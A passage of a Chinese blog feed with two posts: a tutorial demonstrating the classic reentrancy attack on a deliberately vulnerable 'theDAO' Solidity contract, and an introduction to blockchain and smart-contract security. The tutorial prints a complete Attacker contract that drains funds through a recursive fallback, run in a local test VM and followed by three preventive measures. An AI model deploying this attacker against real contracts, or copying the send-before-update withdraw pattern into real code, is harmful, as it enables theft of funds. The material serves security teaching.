builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 存款函数，攻击合约攻击时会先存入一定金额</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// 取款函数</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">//_credit 为账户在该合约的存款</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">//amount 是单次取款的金额</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 关键漏洞函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            _credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> amount<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// 查询函数，查看账户在该合约中的存款</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">creditOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">return</span> _credit<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">// 查询函数，查看该合约中的余额</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">// 攻击合约</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attacker</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    theDAO <span class=\"token keyword\">public</span> _newDAO<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> times <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">Attacker</span><span class=\"token punctuation\">(</span>theDAO addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        _owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        _newDAO <span class=\"token operator\">=</span> addr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    \t<span class=\"token comment\">// 向漏洞合约存钱</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token comment\">// 从漏洞合约取钱</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">checkBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">// 记录函数，记录 fallback 函数执行次数</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">times</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">return</span> times<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token comment\">//fallback 回退函数</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    \ttimes <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        _newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"合约编译-部署与执行\"><a class=\"anchor\" href=\"#合约编译-部署与执行\">#</a> 合约编译、部署与执行</h3>\n<blockquote>\n<p>​\t\t合约的编译和部署在在线编译网站<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZw==\"> http://remix.ethereum.org</span> 上进行，也可以选择本地编译器 solc 进行。</p>\n</blockquote>\n<h4 id=\"编译合约\"><a class=\"anchor\" href=\"#编译合约\">#</a> 编译合约</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/image-20210424121204202.png\" alt=\"\" /></p>\n<blockquote>\n<p>注意编译版本尽量与声明版本号一致。</p>\n</blockquote>\n<h4 id=\"部署合约\"><a class=\"anchor\" href=\"#部署合约\">#</a> 部署合约</h4>\n<p>​\t\t本次演示合约将部署在本地环境<strong> JavaScript VM</strong> 上。</p>\n<p>​\t\t首先部署漏洞合约 theDAO，部署完成后向合约转入一定金额。</p>\n<p>​\t\t接着部署<strong>攻击合约</strong>，在部署时输入<strong>漏洞合约</strong>的地址，并在部署时转入一定金额。</p>\n<blockquote>\n<p>​\t\t这里转账顺序与合约源码有关，有三种接受转账方式（部署转账、合约转账、直接转账），在编译前根据需求（安全性、便利性）灵活使用。</p>\n</blockquote>\n<h4 id=\"执行攻击\"><a class=\"anchor\" href=\"#执行攻击\">#</a> 执行攻击</h4>\n<ol>\n<li>先分别点击<strong>漏洞合约</strong>的 checkBalance 选项和<strong>攻击合约</strong>的 checkBalance 选项，确认攻击前两个合约内的金额数量。</li>\n<li>点击攻击合约的 attack 选项，对<strong>漏洞合约</strong>进行攻击。</li>\n<li>待攻击完成后，分别点击<strong>漏洞合约</strong>的 checkBalance 选项和<strong>攻击合约</strong>的 checkBalance 选项，确认攻击后两个合约内的金额数量。</li>\n<li>点击<strong>攻击合约</strong>的 times 选项，以<strong>攻击合约</strong>执行一次 fallback 回退函数为指标，查看攻击次数。</li>\n</ol>\n<h4 id=\"过程分析\"><a class=\"anchor\" href=\"#过程分析\">#</a> 过程分析</h4>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1.</span>攻击合约执行_newDAO<span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>向漏洞合约转账<span class=\"token number\">10</span>wei，这时漏洞合约会记录攻击合约的存款为<span class=\"token number\">10</span>wei。其中sender是攻击合约地址，value是我们转入的金额。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">2.</span>攻击合约接着执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>意图从漏洞合约中取出<span class=\"token number\">10</span>wei。这时漏洞合约会比较我们希望取出的金额和存款的金额，因为我们是存<span class=\"token number\">10</span>取<span class=\"token number\">10</span>，所以成功通过比较。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">3.</span>这时会执行漏洞合约中的msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>使漏洞合约向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">4.</span>攻击合约接收到<span class=\"token number\">10</span>wei后执行fallback回退函数，从而执行_newDAO<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>继续从漏洞合约中取出<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">5.</span>因为在上一次取款中，漏洞合约执行msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>后因为回退函数跳转回withdraw的开头，并没有执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>导致攻击合约在漏洞合约中的余额还是<span class=\"token number\">10</span>wei（尽管我们已经取走了<span class=\"token number\">10</span>wei），因此漏洞合约继续向攻击合约转账<span class=\"token number\">10</span>wei。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">6.</span>攻击合约会不断重复步骤<span class=\"token number\">4</span>和<span class=\"token number\">5</span>，直到gas达到该次交易的上限或者漏洞合约中的余额用尽。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">7.</span>这时才会继续往下执行_credit<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>让攻击合约在漏洞合约中的存款变为<span class=\"token number\">0</span>，然后结束合约的执行。</pre></td></tr></table></figure><h4 id=\"运行结果\"><a class=\"anchor\" href=\"#运行结果\">#</a> 运行结果</h4>\n<p>​\t\t攻击合约通过重入攻击，窃取了漏洞合约中大量以太币。</p>\n<h2 id=\"预防措施\"><a class=\"anchor\" href=\"#预防措施\">#</a> 预防措施</h2>\n<ol>\n<li>\n<p>在合约中，遇到向外部合约转账的情况时，使用 solidity 中内置的 transfer () 函数，而不是 call () 函数。</p>\n<p>transfer () 函数仅会发送 2300 Gas 给用于合约的外部调用，这不足以攻击合约反复重入原合约。</p>\n</li>\n<li>\n<p>确保所有改变状态变量的逻辑，都发生在以太币被发送出合约（或任何外部调用）之前。</p>\n<p>上面的合约之所以能被重入攻击，很大一部分原因在于漏洞合约在转账时是先转账，再对用户的余额数进行修改，这使得合约在被重入攻击时，用户的余额数一致不变。如果是先修改余额再转账，攻击合约在第一次重入取款函数时，就会因为余额不足而失败。</p>\n</li>\n<li>\n<p>引入互斥锁，添加一个状态变量，在合约代码执行期间锁定合约，使得代码执行完之前只能有一个线程执行函数，防止函数被重入调用。</p>\n</li>\n</ol>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://coldwinds5167.github.io/2021/12/Blockchain-profiles/",
            "url": "https://coldwinds5167.github.io/2021/12/Blockchain-profiles/",
            "title": "区块链简介",
            "date_published": "2021-12-11T11:47:26.000Z",
            "content_html": "<h1 id=\"区块链简介\"><a class=\"anchor\" href=\"#区块链简介\">#</a> 区块链简介</h1>\n<h2 id=\"概念定义\"><a class=\"anchor\" href=\"#概念定义\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t区块链是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlODglODYlRTUlQjglODMlRTUlQkMlOEYvMTkyNzYyMzI=\">分布式</span>数据存储、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODIlQjklRTUlQUYlQjklRTclODIlQjklRTQlQkMlQTAlRTglQkUlOTMvODQ5MTk1Ng==\">点对点传输</span>、共识机制、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEElQTAlRTUlQUYlODYlRTclQUUlOTclRTYlQjMlOTUvMjgxNjIxMw==\">加密算法</span>等计算机技术的新型应用模式。区块链（Blockchain），是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的一个重要概念，它本质上是一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEUlQkIlRTQlQjglQUQlRTUlQkYlODMlRTUlOEMlOTYvODcxOTUzMg==\">去中心化</span>的数据库，同时作为<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQUYlOTQlRTclODklQjklRTUlQjglODEvNDE0MzY5MA==\">比特币</span>的底层技术，是一串使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODYlRTclQTAlODElRTUlQUQlQTYvNDgwMDAx\">密码学</span>方法相关联产生的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOTUlQjAlRTYlOEQlQUUlRTUlOUQlOTcvMTA3Njcy\">数据块</span>，每一个数据块中包含了一批次比特币网络交易的信息，用于验证其信息的有效性（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOTglQjIlRTQlQkMlQUEvOTYzODU1MA==\">防伪</span>）和生成下一个区块。其具有去中心化、不可篡改、全程留痕、可以追溯、集体维护、公开透明等特点。</p>\n</blockquote>\n<h2 id=\"特点\"><a class=\"anchor\" href=\"#特点\">#</a> 特点</h2>\n<h3 id=\"去中心化\"><a class=\"anchor\" href=\"#去中心化\">#</a> 去中心化</h3>\n<p>​\t\t在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为暂时的中心，实现点对点的直接连接。</p>\n<h3 id=\"不可篡改全程留痕可以追溯\"><a class=\"anchor\" href=\"#不可篡改全程留痕可以追溯\">#</a> 不可篡改 / 全程留痕 / 可以追溯</h3>\n<p>​\t\t在区块链中，每一个数据块都通过密码学算法计算和记录一段时间系统内全部信息交流的数据，并依据这些数据生成该数据块的指纹用于连接或生成下一个数据块并检验其信息的有效性。</p>\n<p>​\t\t如果修改一个区块的数据，这个区块便不被其他区块承认，而又因为其<strong>去中心化</strong>的特点，使得大规模修改区块数据十分困难，达到了<strong>不可篡改</strong>的效果。</p>\n<p>​\t\t区块链上每一个新区块的生成都包含了旧区块的信息，使得区块链储存了系统全部的历史数据，达到了<strong>全程留痕</strong>的效果。</p>\n<p>​\t\t区块链中的所有节点在每一个区块上都有一个时间戳，表示这个信息是这个时间写入的。又因其<strong>不可篡改</strong>的特点，使得区块链上每一条数据都可以通过链式结构追本溯源，验证其存在性，达到了<strong>可以追溯</strong>的特点。</p>\n<h3 id=\"集体维护\"><a class=\"anchor\" href=\"#集体维护\">#</a> 集体维护</h3>\n<p>​\t\t因为<strong>去中心化</strong>，区块链中的数据块由系统中所有具有维护功能的节点来共同维护，同时这些节点是开源的，任何人都可以参与。并且每一个节点在参与记录的同时也来验证其他节点记录结果的正确性，维护效率提高，成本降低。</p>\n<h3 id=\"公开透明隐私保护\"><a class=\"anchor\" href=\"#公开透明隐私保护\">#</a> 公开透明 / 隐私保护</h3>\n<p>​\t\t区块链中储存了系统全部的历史信息交流数据，并且<strong>可以追溯</strong>，使得区块链中的数据<strong>公开透明</strong>。</p>\n<p>​\t\t存储在区块链上的交易信息是公开的，但是账户身份信息是高度加密的。为了保护区块链中用户的隐私，BTC 通过隔断交易地址和地址持有人真实身份的关联（利用公钥哈希值作为交易标识），来达到匿名的效果，即知道有这笔交易，但不知道由谁交易给谁。但通过观察和跟踪区块链的信息，分析重复使用公钥哈希值和多次重复的 IP 信息，还是可以追查到帐户和交易的关联性，同时进行社工分析，就有可能被找出现实中的身份信息。</p>\n<p>​\t\t为了更好地保护隐私，基于加密算法，主要产生了以下四种加密方案：</p>\n<blockquote>\n<p>混币原理：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlQjclQjclRTUlQjglODElRTYlOUMlOEQlRTUlOEElQTE=\">https://baike.baidu.com/item/ 混币服务</span></p>\n</blockquote>\n<blockquote>\n<p>环签名：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclOEUlQUYlRTclQUQlQkUlRTUlOTAlOEQ=\">https://baike.baidu.com/item/ 环签名</span></p>\n</blockquote>\n<blockquote>\n<p>同态加密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOTAlOEMlRTYlODAlODElRTUlOEElQTAlRTUlQUYlODY=\">https://baike.baidu.com/item/ 同态加密</span></p>\n</blockquote>\n<blockquote>\n<p>零知识证明（ZKP）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTklOUIlQjYlRTclOUYlQTUlRTglQUYlODYlRTglQUYlODElRTYlOTglOEU=\">https://baike.baidu.com/item/ 零知识证明</span></p>\n</blockquote>\n<h1 id=\"智能合约\"><a class=\"anchor\" href=\"#智能合约\">#</a> 智能合约</h1>\n<h2 id=\"概念定义-2\"><a class=\"anchor\" href=\"#概念定义-2\">#</a> 概念定义</h2>\n<blockquote>\n<p>​\t\t智能合约是一种旨在以信息化方式传播、验证或执行合同的计算机协议。智能合约允许在没有第三方的情况下进行可信交易，这些交易可追踪且不可逆转。</p>\n<p>​\t\t智能合约的目的是提供优于传统合约的安全方法，并减少与合约相关的其他交易成本。</p>\n</blockquote>\n<h2 id=\"数字形式\"><a class=\"anchor\" href=\"#数字形式\">#</a> 数字形式</h2>\n<blockquote>\n<p>数字形式意味着合约不得不写入计算机可读的代码中。</p>\n</blockquote>\n<p>​\t\t简单来讲，智能合约就是部署在区块链上的代码，而代码的执行则是在代码的执行是在本地的 EVM 中。本地的 EVM 读取了区块链上的代码，并在本地运行后，再将结果写入到区块链中。</p>\n<h2 id=\"智能合约的安全\"><a class=\"anchor\" href=\"#智能合约的安全\">#</a> 智能合约的安全</h2>\n<p>​\t\t既然智能合约的本质是能够运行的代码，那么相应的，它也会产生出一系列安全漏洞，并且大部分智能合约是开源的，剩余的小部分，也可以进行反编译，这使得智能合约的漏洞会更容易被找到。</p>\n<p>​\t\tPWN 中的智能合约题，便是利用合约代码中的漏洞，对合约进行攻击，从而达到获取 flag 的目的。</p>\n<p>​\t\t比较经典的攻击有：</p>\n<ul>\n<li>重入攻击</li>\n<li>整数溢出</li>\n<li>伪随机数回滚攻击</li>\n<li>薅羊毛（Airdrop Hunting）</li>\n<li>短地址攻击</li>\n<li>…………</li>\n</ul>\n",
            "tags": [
                "Blockchain"
            ]
        }
    ]
}